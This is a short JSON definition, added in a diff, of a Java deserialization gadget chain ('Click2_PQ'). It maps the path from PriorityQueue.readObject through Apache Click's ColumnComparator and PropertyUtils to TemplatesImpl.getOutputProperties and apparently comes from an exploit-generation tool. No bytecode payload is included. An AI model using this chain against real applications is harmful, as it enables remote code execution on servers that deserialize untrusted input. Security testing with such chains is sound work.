@@ -1,0 +1,28 @@
+{
+    "chain_type": "Click2_PQ — PriorityQueue + ColumnComparator → PropertyUtils → TemplatesImpl",
+    "root_class": "java.util.PriorityQueue",
+    "root_trigger": "readObject→heapify→siftDown→ColumnComparator.compare→PropertyUtils.getProperty→TemplatesImpl.getOutputProperties",
+    "links": [
+        {
+            "class": "org.apache.click.control.Column$ColumnComparator",
+            "field_overrides": {
+                "column": {"$ref": "link:1"}
+            }
+        },
+        {
+            "class": "org.apache.click.control.Column",
+            "field_overrides": {
+                "name": "outputProperties"
+            }
+        },
+        {
+            "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+            "field_overrides": {
+                "_name": "exploit",
+                "_class": null,
+                "_bytecodes": null
+            }
+        }
+    ],
+    "sink_method": "TemplatesImpl.getOutputProperties"
+}
